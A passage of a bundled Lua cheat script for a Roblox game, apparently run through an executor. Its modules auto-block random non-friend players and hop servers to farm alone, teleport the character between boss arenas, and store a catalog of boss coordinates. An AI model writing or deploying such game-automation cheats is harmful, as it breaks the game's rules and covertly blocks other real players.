                if ticket.Hops==0 or retriedUser==person.UserId then ticket.LastBlockedUserId=person.UserId;hop(epoch);return end
                error("A blocked player is in the joined server; matchmaking exclusion is not reliable here")
            end
            local friend=ctx.IsFriend(person)
            if not current(epoch)then return end
            if friend==false then eligible[#eligible+1]=person end
        end
        if #eligible==0 then api.Stop("No eligible players to block (friends are skipped)");return end
        local person=ctx.ChooseTarget and ctx.ChooseTarget(eligible)or eligible[ctx.Random(#eligible)]
        if not ctx.IsPresent(person)then run.settle=ctx.Clock()+2;return end
        publish("Blocking @"..person.Name.."...");retriedUser=person.UserId
        local receipt=ctx.Block(person,function()return current(epoch)end)
        if not current(epoch)then return end
        assert(receipt==true,"Roblox rejected the block; no rejoin attempted")
        ticket.LastBlockedUserId=person.UserId;ticket.Added[#ticket.Added+1]=person.UserId
        save()
        if not current(epoch)then return end
        pending=person;api.Phase="Block settling";run.settle=ctx.Clock()+(ctx.BlockSettleSeconds or 3)
        publish("Waiting for the block to register...")
        if ctx.BlockSettleSeconds==0 then confirmPending(epoch)end
    end
    local function update(epoch)
        if api.Phase=="Preparing"then return end
        if ctx.Now()-ticket.StartedAt>=900 then api.Stop("15-minute search limit reached");return end
        if api.Phase=="Teleporting"then
            if ctx.Clock()>=run.deadline then api.Stop("Rejoin timed out; no further blocks added")end
            return
        end
        local people=outsiders()
        if #people==0 then
            run.solo=run.solo or ctx.Clock()
            if ctx.Clock()-run.solo>=(ctx.SoloSeconds or 8)then api.Stop("Protected · only you and whitelisted players","Safe")end
            return
        end
        run.solo=nil
        if ctx.Clock()<run.settle then return end
        if sameServer(epoch,people)or confirmPending(epoch)then return end
        if ticket.Hops>=12 then api.Stop("12-hop search limit reached");return end
        chooseAndBlock(epoch,people)
    end
    function api.Update()
        if not api.Active or run.busy then return end
        run.busy=true
        guard(run.epoch,function()update(run.epoch)end)
        run.busy=false
    end
    function api.TeleportFailed(reason)
        if api.Active and api.Phase=="Teleporting"then api.Stop("Rejoin failed: "..tostring(reason))end
    end
    function api.Retry()
        if api.Active or run.busy or not api.Retryable then return false end
        if not ticket then return api.Start()end
        if ctx.Now()-ticket.StartedAt>=900 or ticket.Hops>=12 then
            api.Retryable=false;publish("Search limit reached · toggle Safe Mode OFF/ON to begin a new search");return false
        end
        local retryHop=api.RetryWasTeleporting
        run.epoch=run.epoch+1
        local epoch=run.epoch
        api.Active=true;api.Phase="Preparing";api.Outcome="Searching";run.busy=true
        local ok=guard(epoch,function()
            ctx.Preflight()
            if not current(epoch)then return end
            local confirmed=blocked(epoch)
            if not confirmed then return end
            ticket.Active=true;save()
            if not current(epoch)then return end
            if retryHop and #outsiders()>0 then
                assert(ticket.LastBlockedUserId and confirmed[ticket.LastBlockedUserId],"Cannot verify previous block · no rejoin attempted")
                hop(epoch);return
            end
            run.settle=ctx.Clock();run.solo=nil;api.Phase="Waiting"
            publish("Retrying Safe Mode · checking this server")
        end)
        run.busy=false
        return ok
    end
    function api.Destroy(preserveResume)
        if preserveResume then run.epoch=run.epoch+1;api.Active=false
        else api.Stop("Search stopped")end
    end
    return api
end

-- END BUNDLED SERVER ISOLATION
    end)()
    local makeSafe=(function()
-- BEGIN BUNDLED SAFE MODE
-- Safe-floor protection and retry ownership are independent from the search worker.
return function(ctx)
    local state,search=ctx.State,ctx.Search
    local api={Seeking=false}
    local session={adopted=false,retries=0,retryAt=nil,protectedAt=nil}
    local clock=ctx.Clock or os.clock
    local protectedMessage="Protected · only you and whitelisted players"
    local function destination()
        return ctx.TargetFloor and ctx.TargetFloor()or state.SafeFloorId
    end
    local function populationSafe()
        if ctx.CurrentFloor()~=destination()then return false end
        for _,person in ipairs(ctx.Players())do if not ctx.Allowed(person)then return false end end
        return true
    end
    local function panic()
        api.Seeking=true
        if ctx.Panic then ctx.Panic()end
    end
    local function protected()
        session.adopted=false;session.retries=0;session.retryAt=nil;session.protectedAt=nil
        api.Seeking=false;api.Paused=false;api.PauseReason=nil
        if ctx.ReleasePanic then ctx.ReleasePanic()end
        if ctx.Protected then ctx.Protected()end
        ctx.Status(protectedMessage)
    end
    function api.AdoptSearch()session.adopted=true end
    function api.Pause(reason)
        api.Paused=true;api.PauseReason=reason;session.retryAt=nil
        panic();ctx.Status("Holding position · "..tostring(reason))
    end
    function api.ObserveProtected()
        if ctx.Suspended and ctx.Suspended()then return end
        local canObserve=state.SafeMode and state.Running and not state.StopEverything and not state.ModeratorBlocking
            and not state.SafeWhitelistResolving and not ctx.Travelling()
        if not canObserve or not populationSafe()then session.protectedAt=nil;return end
        local now=clock()
        session.protectedAt=session.protectedAt or now
        if now-session.protectedAt<.6 then return end
        if search.Active then search.Stop(protectedMessage,"Safe")end
        protected()
    end
    local function recover()
        if populationSafe()then protected();return false end
        panic()
        if not(search.Retryable and type(search.Retry)=="function"and session.retries<3)then
            ctx.Status("Holding position · "..tostring(api.PauseReason)..(session.retries>=3 and " · retries exhausted"or ""))
            return true
        end
        local now=clock()
        session.retryAt=session.retryAt or now+math.min(2,.5*2^session.retries)
        if now<session.retryAt then
            ctx.Status("Safe Mode retry "..(session.retries+1).."/3 in "..math.max(0,math.ceil(session.retryAt-now)).."s · "..tostring(api.PauseReason))
            return true
        end
        session.retries=session.retries+1;session.retryAt=nil;api.Paused=false
        session.adopted=search.Retry()==true
        if not session.adopted then api.Pause(search.Status)end
        return true
    end
    function api.Update()
        if ctx.Suspended and ctx.Suspended()then return end
        if not state.SafeMode or not state.Running or state.StopEverything or state.ModeratorBlocking then return end
        if state.AccountProgression and state.AutomationTeleporting then api.Seeking=true;return end
        if api.Paused and recover()then return end
        if state.SafeWhitelistResolving then
            api.Seeking=true
            for _,person in ipairs(ctx.Players())do if not ctx.Allowed(person)then panic();break end end
            ctx.Status("Checking whitelist entries...")
            return
        end
        local floor=destination()
        if ctx.CurrentFloor()~=floor then
            panic()
            if not ctx.Travelling()then ctx.ChangeFloor(floor)end
            return
        end
        if search.Active then
            session.adopted=true;panic();search.Update();return
        end
        if session.adopted and search.Outcome~="Safe"then
            session.adopted=false;api.Pause(search.Status);ctx.Save();return
        end
        session.adopted=false
        if populationSafe()then protected();return end
        panic()
        session.adopted=search.Start()==true
        if session.adopted then search.Update()else api.Pause(search.Status);ctx.Save()end
    end
    function api.Joined(person)
        if ctx.Suspended and ctx.Suspended()then return end
        if state.SafeMode and not ctx.Allowed(person)then state.SafePendingUserId=person.UserId;panic()end
    end
    function api.Reset()
        session={adopted=false,retries=0}
        api.Seeking=false;api.Paused=false;api.PauseReason=nil
        if search.Active then search.Stop("Safe Mode settings changed")end
        if not state.SafeMode and ctx.ReleasePanic then ctx.ReleasePanic()end
    end
    function api.Destroy()api.Reset()end
    return api
end

-- END BUNDLED SAFE MODE
    end)()
    local makeMulti=(function()
-- BEGIN BUNDLED MULTI SPOT
-- Arena rotation has explicit interruption, travel, clear-confirmation and cooldown stages.
return function(ctx)
    local state=ctx.State
    local api={Phase="Idle",Visits=0,LastVisits={}}
    local clearingAt
    local retry={count=0,due=0}
    local function selected()
        local priority={}
        for index,id in ipairs(state.MultiSpotOrder or {})do priority[id]=index end
        local result={}
        for _,spot in ipairs(ctx.Spots())do
            if spot.PlaceId==ctx.CurrentFloor()and state.MultiSpotSelected[spot.Id]
                and (not state.SafeMode or spot.PlaceId==state.SafeFloorId)then result[#result+1]=spot end
        end
        table.sort(result,function(a,b)
            local x,y=priority[a.Id]or math.huge,priority[b.Id]or math.huge
            return x==y and a.Id<b.Id or x<y
        end)
        return result
    end
    local function fail(now,reason)
        ctx.Release();retry.count=retry.count+1
        local delay=retry.count<3 and retry.count*2 or math.min(60,5*2^math.min(4,retry.count-3))
        retry.due=now+delay;api.RetryAt=retry.due;api.LastError=reason;api.Phase="Retrying travel"
        ctx.Status("Retrying arena in "..delay.."s · "..reason);ctx.Save()
    end
    local function departureReady()
        return not ctx.DepartureReady or ctx.DepartureReady()
    end
    local function go(spot,now,resume)
        if not resume then
            ctx.Release();api.Current=spot;api.CurrentCleared=false;api.EncounterSeen=false;api.WaitingSince=nil
            api.LastVisits[spot.Id]=now;state.MultiSpotCursor=spot.Id;state.MultiSpotPending=spot.Id
        end
        api.Phase="Moving";api.MoveDeadline=now+15
        if not resume then ctx.Save()end
        local sent,reason=ctx.Go(spot,resume)
        if not sent then fail(now,reason or "Arena is unavailable");return false end
        return true
    end
    local function observe()
        local alive,seen=ctx.Encounter(api.Current)
        api.Remaining=alive
        api.EncounterSeen=api.EncounterSeen or seen or alive>0
        return alive
    end
    local function holdLiving()
        clearingAt=nil;api.WaitingSince=nil;api.CurrentCleared=false;api.Phase="Clearing arena"
        ctx.Status(api.Current.Name.." · "..api.Remaining.." mobs remaining")
    end
    local function finishRound(now)
        clearingAt=clearingAt or now
        if now-clearingAt<.6 then return false end
        api.ClearedRounds=(api.ClearedRounds or 0)+1;state.MultiSpotPending=nil
        return true
    end
    local function pickTimed(options,now,exclude)
        local unknown,nextSpot,nextTime
        for _,spot in ipairs(options)do
            local record=ctx.Respawns.Get(spot)
            if spot~=exclude then
                if record and (record.HasLive or record.DueAt and record.DueAt<=now)then return spot end
                if not record or not record.DueAt then
                    if not unknown or (api.LastVisits[spot.Id]or -math.huge)<(api.LastVisits[unknown.Id]or -math.huge)then unknown=spot end
                end
            end
            if record and record.DueAt and record.DueAt>now and (not nextTime or record.DueAt<nextTime)then
                nextSpot,nextTime=spot,record.DueAt
            end
        end
        return unknown,nextSpot,nextTime
    end
    function api.UpdateTimed(now,options)
        if api.Current then
            if observe()>0 then holdLiving();return end
            if api.EncounterSeen and not api.CurrentCleared then
                if not finishRound(now)then return end
                api.CurrentCleared=true;api.EncounterSeen=false;clearingAt=nil
                if ctx.ClearEncounter then ctx.ClearEncounter()end
            end
        end
        local spot,nextSpot,nextTime=pickTimed(options,now)
        if spot==api.Current and spot then
            api.WaitingSince=api.WaitingSince or now
            if now-api.WaitingSince>=5 then spot=pickTimed(options,now,api.Current)or spot end
        end
        if not spot then
            api.Phase="Waiting for respawn"
            ctx.Status(nextSpot and ("Next spawn · "..nextSpot.Name.." · "..math.max(0,math.ceil(nextTime-now)).."s")or "Waiting for selected arena spawns")
            return
        end
        if spot==api.Current then
            local record=ctx.Respawns.Get(spot)
            api.Phase="Waiting for spawn"
            ctx.Status((record and record.DueAt and "Spawn due · waiting for "or "Waiting for arena mobs to spawn · ")..spot.Name)
            return
        end
        if departureReady()then go(spot,now,false)end
    end
    local function completeTravel(now)
        if api.Phase~="Moving"then return true end
        if ctx.Moving()then
            if now>(api.MoveDeadline or math.huge)then fail(now,"Travel timed out")end
            return false
        end
        if not ctx.Arrived(api.Current)then fail(now,"Arrival was not confirmed");return false end
        api.MoveDeadline=nil;api.LastError=nil;api.RetryAt=nil;retry.count=0
        observe();api.Phase="Waiting for spawn";clearingAt=nil;api.Visits=api.Visits+1
        ctx.Status("Waiting for arena mobs to spawn · "..api.Current.Name)
        return true
    end
    local function priority(now)
        local target=ctx.PriorityTarget and ctx.PriorityTarget(now)
        if target then
            if not api.PrioritySuspended then
                if api.Current then observe()end
                if ctx.Suspend then ctx.Suspend()end
                api.PrioritySuspended=true;clearingAt=nil
            end
            ctx.Status("Priority enemy · "..target.Name.." · selected arenas will resume")
            return true
        end
        if not api.PrioritySuspended then return false end
        if not ctx.CanMove()or not departureReady()then return true end
        api.PrioritySuspended=false
        if ctx.Resume then ctx.Resume()end
        local resume
        for _,spot in ipairs(selected())do if api.Current and spot.Id==api.Current.Id then resume=spot;break end end
        if resume and ctx.Respawns then
            local record=ctx.Respawns.Get(resume)
            if record and record.DueAt and record.DueAt>now and ctx.Encounter(resume)==0 then resume=nil end
        end
        if resume then
            if go(resume,now,true)then ctx.Status("Returning to selected arena · "..resume.Name)end
            return true
        end
        api.Current=nil;api.Phase="Idle"
        return false
    end
    local function nextUntimed(options,now)
        if api.Current then
            if observe()>0 then holdLiving();return end
            if not api.EncounterSeen then api.Phase="Waiting for spawn";ctx.Status("Waiting for arena mobs to spawn · "..api.Current.Name);return end
            if not finishRound(now)then return end
            api.Phase="Cleared";ctx.Status("Arena cleared · moving to next spot")
            if #options==1 and options[1].Id==api.Current.Id then
                state.MultiSpotPending=api.Current.Id;api.EncounterSeen=false;clearingAt=nil;api.Phase="Waiting for spawn"
                if ctx.ClearEncounter then ctx.ClearEncounter()end
                ctx.Status("Arena cleared · waiting for the next spawn");return
            end
        end
        local nextSpot
        local cursor=0
        for index,spot in ipairs(options)do
            if spot.Id==state.MultiSpotPending then nextSpot=spot end
            if spot.Id==state.MultiSpotCursor then cursor=index end
        end
        nextSpot=nextSpot or options[cursor%#options+1]
        if ctx.CurrentFloor()~=nextSpot.PlaceId then
            state.MultiSpotPending=nextSpot.Id;ctx.Status("Travelling to "..nextSpot.Floor.Name);ctx.ChangeFloor(nextSpot.PlaceId);return
        end
        if departureReady()then go(nextSpot,now,false)end
    end
    function api.Update(now)
        if not state.MultiSpot or not state.Running or api.Phase=="Paused"then return end
        if ctx.Respawns then ctx.Respawns.Update(now,ctx.Spots())end
        if priority(now)then return end
        if api.Phase=="Retrying travel"then
            if now<retry.due then ctx.Status("Retrying arena in "..math.max(1,math.ceil(retry.due-now)).."s · "..tostring(api.LastError));return end
            if not ctx.CanMove()then return end
            api.Current=nil;api.Phase="Idle"
        end
        if not completeTravel(now)or not ctx.CanMove()then return end
        local options=selected()
        if #options==0 then ctx.Status(state.SafeMode and "Select arenas on the Safe Mode floor"or "Select at least one arena");return end
        if ctx.Respawns then api.UpdateTimed(now,options)else nextUntimed(options,now)end
    end
    function api.Reset()
        api.Current=nil;api.Phase="Idle";api.EncounterSeen=false;api.CurrentCleared=false;api.WaitingSince=nil
        api.LastVisits={};api.LastError=nil;api.MoveDeadline=nil;api.PrioritySuspended=false;api.RetryAt=nil
        retry={count=0,due=0};clearingAt=nil;ctx.Release()
    end
    function api.Pause(reason)
        ctx.Release();api.Phase="Paused";api.LastError=tostring(reason)
        ctx.Status("Multi Spot paused · "..api.LastError.." · toggle off/on to retry")
    end
    function api.Destroy()api.Reset()end
    return api
end

-- END BUNDLED MULTI SPOT
    end)()
    local makeCatalog=(function()
-- BEGIN BUNDLED FLOOR CATALOG
-- Source-provided arena coordinates; current-floor discoveries may refine them.
return function(ctx)
    local source = {
        [542351431]={
            ["Boss"]=Vector3.new(-2939,-234,1216),
        },
        [548231754]={
            ["Boss"]=Vector3.new(-2010,443,-8956),
        },
        [555980327]={
            ["Boss"]=Vector3.new(-393,4168,-369),
        },
        [572487908]={
            ["Boss"]=Vector3.new(-2319,2073,95),
        },
        [580239979]={
            ["Boss"]=Vector3.new(2182,1236,-717),
        },
        [582198062]={
            ["Boss"]=Vector3.new(3329,730,-475),
        },
        [548878321]={
            ["Boss"]=Vector3.new(1550,4081,7720),
            ["Miniboss"]=Vector3.new(3772,5743,-9686),
        },
        [573267292]={
            ["Boss"]=Vector3.new(12392,429,-3415),
            ["Miniboss"]=Vector3.new(1926,2889,-11348),
            ["Second miniboss"]=Vector3.new(-3613,2905,-7708),
        },
        [2659143505]={
            ["Boss"]=Vector3.new(104,931,23842),
            ["Miniboss"]=Vector3.new(50,261,18107),
        },
        [5287433115]={
            ["Duality Reaper"]=Vector3.new(6154,846,-4251),
            ["Za, the Eldest"]=Vector3.new(1753,921,-6389),
            ["Miniboss"]=Vector3.new(5129,1614,2104),
            ["Boss"]=Vector3.new(5187,2343,6239),
        },
        [6144637080]={
            ["Limor the Devourer"]=Vector3.new(450,-337,7912),
            ["Radioactive Experiment"]=Vector3.new(-3754,167,3570),
            ["Suspended Unborn"]=Vector3.new(-2439,60,5389),
            ["C-618 Uriotol, The Forgotten Hunter"]=Vector3.new(1685,288,3749),
            ["Warlord"]=Vector3.new(1031,108,5474),
        },
        [13965775911]={["Atheon arena"]=Vector3.new(840,798,336)},
        [134019705603409]={
            ["Aeganatos, The Sunken Sovereign"]=Vector3.new(1500,792,127),
            Leviathan=Vector3.new(12,1313,-823),
            Kraken=Vector3.new(353,-319,120),
        },
    }
    local supplied = {
        [542351431]={
            ["Boss"]={Name="Rahjin the Thief King",Kind="Boss",RespawnSeconds=90,EncounterNames={["Rahjin the Thief King"]=true}},
        },
        [548231754]={
            ["Boss"]={Name="Borik the BeeKeeper",Kind="Boss",RespawnSeconds=90,EncounterNames={["Borik the BeeKeeper"]=true}},
        },
        [555980327]={
            ["Boss"]={Name="Ra'thae the Ice King",Kind="Boss",RespawnSeconds=90,EncounterNames={["Ra'thae the Ice King"]=true}},
        },
        [572487908]={
            ["Boss"]={Name="Irath The Lion",Kind="Boss",RespawnSeconds=90,EncounterNames={["Irath The Lion"]=true}},
        },
        [580239979]={
            ["Boss"]={Name="Sa'jun the Centurian Chieftain",Kind="Boss",RespawnSeconds=90,EncounterNames={["Sa'jun the Centurian Chieftain"]=true}},
        },
        [582198062]={
            ["Boss"]={Name="Smashroom the Mushroom Behemoth",Kind="Boss",RespawnSeconds=90,EncounterNames={["Smashroom the Mushroom Behemoth"]=true}},
        },
        [548878321]={
            ["Boss"]={Name="Formaug the Jungle Giant",Kind="Boss",RespawnSeconds=90,EncounterNames={["Formaug the Jungle Giant"]=true}},
            ["Miniboss"]={Name="Hippogriff",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Hippogriff"]=true}},
        },
        [573267292]={
            ["Boss"]={Name="Mortis the Flaming Sear",Kind="Boss",RespawnSeconds=90,EncounterNames={["Mortis the Flaming Sear"]=true}},
            ["Miniboss"]={Name="Polyserpant",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Polyserpant"]=true}},
            ["Second miniboss"]={Name="Gargoyle Reaper",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Gargoyle Reaper"]=true}},
        },
        [2659143505]={
            ["Boss"]={Name="Grim the Overseer",Kind="Boss",RespawnSeconds=90,EncounterNames={["Grim the Overseer"]=true}},
            ["Miniboss"]={Name="Baal, The Tormentor",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Baal, The Tormentor"]=true}},
        },
        [5287433115]={
            ["Duality Reaper"]={Name="Duality Reaper",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Duality Reaper"]=true}},
            ["Za, the Eldest"]={Name="Za, the Eldest",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Za, the Eldest"]=true}},
            ["Miniboss"]={Name="DA, RA, KA",Kind="Mini boss",RespawnSeconds=45,EncounterNames={Da=true,Ra=true,Ka=true}},
            ["Boss"]={Name="Saurus, the All-Seeing",Kind="Boss",RespawnSeconds=90,EncounterNames={["Saurus, the All-Seeing"]=true}},
        },
        [6144637080]={
            ["Limor the Devourer"]={Name="Limor the Devourer",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Limor the Devourer"]=true}},
            ["Radioactive Experiment"]={Name="Radioactive Experiment",Kind="Boss",RespawnSeconds=90,EncounterNames={["Radioactive Experiment"]=true}},
            ["Suspended Unborn"]={Name="Suspended Unborn",Kind="Boss",RespawnSeconds=90,EncounterNames={["Suspended Unborn"]=true}},
            ["C-618 Uriotol, The Forgotten Hunter"]={Name="C-618 Uriotol, The Forgotten Hunter",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["C-618 Uriotol, The Forgotten Hunter"]=true}},
            ["Warlord"]={Name="Warlord",Kind="Mini boss",RespawnSeconds=45,EncounterNames={["Warlord"]=true}},
        },
        [134019705603409]={
            ["Aeganatos, The Sunken Sovereign"]={Name="Aeganatos, The Sunken Sovereign",Kind="Boss",RespawnSeconds=60,EncounterNames={["Aeganatos, The Sunken Sovereign"]=true}},
            Leviathan={Name="Leviathan",Kind="Boss",RespawnSeconds=45,EncounterNames={Leviathan=true}},
            Kraken={Name="Kraken",Kind="Boss",RespawnSeconds=45,EncounterNames={Kraken=true}},
        },
    }
    local numbers = {[542351431]=1,[548231754]=2,[555980327]=3,[572487908]=4,[580239979]=5,[566212942]=6,
        [582198062]=7,[548878321]=8,[573267292]=9,[2659143505]=10,[5287433115]=11,[6144637080]=12,[13965775911]=13,[134019705603409]=14,[78945654064532]=15}
    local catalog={Floors={},FloorById={},Spots={},SpotById={},Aliases={}}
    local function clean(name)return tostring(name or ""):lower():gsub("[^%w]","")end
    local function accepts(spot,name)
        if not spot.EncounterNames then return true end
        local identity=clean(name)
        for expected in pairs(spot.EncounterNames)do if clean(expected)==identity then return true end end
        return false
    end
    local function register(spot)
        catalog.Spots[#catalog.Spots+1]=spot
        catalog.SpotById[spot.Id]=spot
        return spot
    end
    local function alias(key,spot)
        catalog.Aliases[key]=spot.Id
        catalog.SpotById[key]=spot
    end
    local function label(floor,name)return floor.Label.." · "..name end
    for _,definition in ipairs(ctx.Floors)do
        local number=numbers[definition.PlaceId]
        if number then
            local floor={Id=definition.PlaceId,Number=number,Name=definition.Name,Unlocked=ctx.Unlocked(definition)}
            floor.Label=(floor.Id==134019705603409 or floor.Id==78945654064532) and floor.Name or "F"..number.." · "..floor.Name
            catalog.Floors[#catalog.Floors+1]=floor;catalog.FloorById[floor.Id]=floor
        end
    end
    table.sort(catalog.Floors,function(a,b)return a.Number<b.Number end)
    local specialKinds={Leviathan="Boss",["Suspended Unborn"]="Arena",["Limor the Devourer"]="Arena",
        ["Radioactive Experiment"]="Arena",["Za, the Eldest"]="Mini boss",["Wa, the Curious"]="Arena",
        ["Duality Reaper"]="Mini boss",["Atheon arena"]="Arena"}
    for place,points in pairs(source)do
        local floor=catalog.FloorById[place]
        if floor then
            for raw,position in pairs(points)do
                local key=raw:match("^%s*(.-)%s*$")
                local info=supplied[place]and supplied[place][key]
                local kind=info and info.Kind or (key=="Boss"and "Boss")
                    or ((key=="Miniboss"or key=="Second miniboss")and "Mini boss")or specialKinds[key]
                if kind then
                    local name=info and info.Name or (key=="Boss"and "Boss arena")or (key=="Miniboss"and "Mini-boss arena")or key
                    local encounters=info and info.EncounterNames
                    if not encounters and place==13965775911 then encounters={Atheon=true,["Corrupted Atheon"]=true}end
                    if not encounters and place==134019705603409 and key=="Leviathan"then encounters={Leviathan=true}end
                    register({Id=tostring(place).."/"..key,PlaceId=place,Name=name,Kind=kind,Position=position,
                        DestinationId="source:"..key,Floor=floor,Label=label(floor,name),
                        RespawnSeconds=info and info.RespawnSeconds,MainBoss=key=="Boss",
                        PositionLocked=info~=nil or place==13965775911,EncounterNames=encounters})
                end
            end
        end
    end
    local function customAreas(areas,place,floor)
        for id,area in pairs(areas)do
            if id:sub(1,16)=="saved:multispot:"then
                local key=tostring(place).."/"..id
                local existing=catalog.SpotById[key]
                if existing then existing.Position=area.Position
                else register({Id=key,PlaceId=place,Name=area.Name,Kind="Arena",Position=area.Position,
                    DestinationId=id,Floor=floor,Label=label(floor,area.Name),PositionLocked=true})end
            end
        end
    end
    local function refineGeneric(areas,place)
        for _,kind in ipairs({"Boss","Mini boss"})do
            local key=kind=="Boss"and "Boss"or "Miniboss"
            local spot=catalog.SpotById[tostring(place).."/"..key]
            if spot and not spot.PositionLocked then
                local nearest,distance
                for id,area in pairs(areas)do
                    if id:sub(1,4)=="mob:"and area.Kind==kind and accepts(spot,id:sub(5))then
                        local current=(area.Position-spot.Position).Magnitude
                        if not distance or current<distance then nearest,distance=area,current end
                    end
                end
                if nearest then spot.Position=nearest.Position;spot.DestinationId=nearest.Id;spot.SourceRefined=true end
            end
        end
    end
    local function matchArea(area,id,place)
        local name=id:sub(1,4)=="mob:"and id:sub(5)or area.Name
        local primary
        if place==13965775911 and (name=="Atheon"or name=="Corrupted Atheon")then
            primary=catalog.SpotById[tostring(place).."/Atheon arena"]
        end
        if not primary then
            for _,spot in ipairs(catalog.Spots)do
                if spot.PlaceId==place and (spot.Name:lower()==name:lower()or spot.EncounterNames and spot.EncounterNames[name])then
                    primary=spot;break
                end
            end
        end
        if primary then
            if not primary.PositionLocked then
                primary.Position=area.Position;primary.DestinationId=id;primary.Kind=area.Kind;primary.SourceRefined=true
            end
            return primary,name
        end
        local closest
        for _,spot in ipairs(catalog.Spots)do
            if spot.PlaceId==place and accepts(spot,name)
                and (spot.Kind==area.Kind or spot.PositionLocked and spot.Kind=="Arena")then
                local distance=(spot.Position-area.Position).Magnitude
                if distance<=220 and (not closest or distance<closest)then primary,closest=spot,distance end
            end
        end
        return primary,name
    end
    function catalog.AddCurrent(areas,place)
        local floor=catalog.FloorById[place]
        if not floor then return end
        areas=areas or {}
        customAreas(areas,place,floor)
        refineGeneric(areas,place)
        for id,area in pairs(areas)do
            if (area.Kind=="Boss"or area.Kind=="Mini boss")and id:sub(1,7)~="source:"then
                local key=tostring(place).."/"..id
                local spot,name=matchArea(area,id,place)
                if spot then alias(key,spot)
                elseif not supplied[place]then
                    register({Id=key,PlaceId=place,Name=name,Kind=area.Kind,Position=area.Position,
                        DestinationId=id,Floor=floor,Label=label(floor,name)})
                end
            end
        end
    end
    function catalog.NormalizeSelection(selection)
        local normalized={}
        for id,on in pairs(selection or {})do if on then normalized[catalog.Aliases[id]or id]=true end end
        return normalized
    end
    local kindOrder={Boss=1,["Mini boss"]=2,Arena=3}
    function catalog.Sort()
        table.sort(catalog.Spots,function(a,b)
            if a.Floor.Number~=b.Floor.Number then return a.Floor.Number<b.Floor.Number end
            if a.Kind~=b.Kind then return (kindOrder[a.Kind]or 4)<(kindOrder[b.Kind]or 4)end
            if a.Name~=b.Name then return a.Name<b.Name end
            return a.Id<b.Id
        end)
    end
    catalog.Sort()
    return catalog
end

-- END BUNDLED FLOOR CATALOG
    end)()
    local makeUI=(function()
-- BEGIN BUNDLED AUTOMATION UI
-- Publish automation status into lightweight records consumed by modern WindUI.
return function(ctx)
    local state=ctx.State
    local defaults={SafeModeStatus="Safe Mode is off",MultiSpotStatus="Multi Spot is off",AutoJoinFriendStatus="Auto Join Friend is off"}
    local inputs={"SafeMode","SafeFloor","SafeWhitelist","MultiSpot","MultiSpotDropdown","AutoJoinFriend","JoinFriendUsername"}
    local function record(name)
        local value=ctx.Create("TextBox",{Name=name,Text=state[name]or ""},ctx.Parent)
        state.UI[name]=value
        return value
    end
    for _,name in ipairs(inputs)do record(name)end
    for name in pairs(defaults)do record(name)end
    state.UI.SafeWhitelist.Text=state.SafeWhitelistText or ""
    state.CloseAutomationMenus=function()end
    local api={}
    function api.Refresh()
        for name,fallback in pairs(defaults)do
            local text=state[name]or fallback
            if state.UI[name].Text~=text then state.UI[name].Text=text end
        end
    end
    api.Refresh()
    return api
end

-- END BUNDLED AUTOMATION UI
    end)()
    local attach=(function()
-- BEGIN BUNDLED SERVER ISOLATION CLIENT
-- Native Roblox/executor boundary for safe search, floor travel and arena rotation.
return function(ctx)
    local state,player,Players=ctx.State,ctx.Player,ctx.Players
    local betweenId=78945654064532
    local inBetween=game.PlaceId==betweenId
    local function waitingForBetween()
        return not inBetween and not state.AccountProgression and state.SafeFloorId==betweenId
    end
    local farmClock=state.FarmClock or os.clock
    state.SafeWhitelistText=type(state.SafeWhitelistText)=="string"and state.SafeWhitelistText or ""
    state.SafeWhitelistIds=type(state.SafeWhitelistIds)=="table"and state.SafeWhitelistIds or {}
    state.MultiSpotSelected=type(state.MultiSpotSelected)=="table"and state.MultiSpotSelected or {}
    state.MultiSpotOrder=type(state.MultiSpotOrder)=="table"and state.MultiSpotOrder or {}
    local HttpService=game:GetService("HttpService")
    local StarterGui=game:GetService("StarterGui")
    local TeleportService=game:GetService("TeleportService")
    local GuiService=game:GetService("GuiService")
    local path="SB2Codex/solo-search_"..player.UserId..".json"
    local queuedResume=getgenv().SB2SoloResumeTicket
    getgenv().SB2SoloResumeTicket=nil
    local queue,savedSource,validatedSource,validatedPath,validatedGeneration
    local virtualInput
    pcall(function()virtualInput=game:GetService("VirtualInputManager")end)
    local blockPoint=ctx.BlockPoint or function(button,inset)return button.AbsolutePosition+button.AbsoluteSize/2+inset end
    local function workerIdentity()
        if type(setthreadidentity)=="function"then pcall(setthreadidentity,8)end
    end
    local ui
    local definitions=require(game.ReplicatedStorage.Database.Locations).floors
    local nativeFloors={}
    for _,floor in ipairs(definitions)do nativeFloors[floor.PlaceId]=floor end
    local function floorUnlocked(floor)
        if floor.PlaceId==game.PlaceId or floor.PlaceId==betweenId or floor.Unlocked==true then return true end
        local profile=game.ReplicatedStorage.Profiles:FindFirstChild(player.Name)
        local locations=profile and profile:FindFirstChild("Locations")
        return locations~=nil and locations:FindFirstChild(tostring(floor.PlaceId))~=nil
    end
    local catalog=ctx.MakeCatalog({Floors=definitions,Unlocked=floorUnlocked})
    catalog.AddCurrent(state.FloorDestinations,game.PlaceId);catalog.Sort()
    state.MultiSpotSelected=catalog.NormalizeSelection(state.MultiSpotSelected)
    state.MultiSpotCursor=catalog.Aliases[state.MultiSpotCursor]or state.MultiSpotCursor
    state.MultiSpotPending=catalog.Aliases[state.MultiSpotPending]or state.MultiSpotPending
    state.AutomationCatalog=catalog
    function state.IsAutomationFloorUnlocked(id)
        local key=tonumber(id)
        local floor=catalog.FloorById[key]
        if not floor or not nativeFloors[key]then return false end
        local unlocked=floorUnlocked(nativeFloors[key])
        if floor.Unlocked~=unlocked then
            floor.Unlocked=unlocked
            state.AutomationFloorUnlockVersion=(state.AutomationFloorUnlockVersion or 0)+1
        end
        return unlocked
    end
    local function refresh()if ui then ui.Refresh()end end
    state.RefreshAutomationUI=refresh
    local function refreshUnlocks()
        for _,floor in ipairs(catalog.Floors)do state.IsAutomationFloorUnlocked(floor.Id)end
        refresh()
    end
    local profile=game.ReplicatedStorage.Profiles:FindFirstChild(player.Name)
    local locations=profile and profile:FindFirstChild("Locations")
    if locations then ctx.Bind(locations.ChildAdded,refreshUnlocks);ctx.Bind(locations.ChildRemoved,refreshUnlocks)end
    local function snapshot()return {Enabled=state.Enabled,AutoFarm=state.AutoFarm,SkillAura=state.SkillAura}end
    local function restoreFeatures(features)
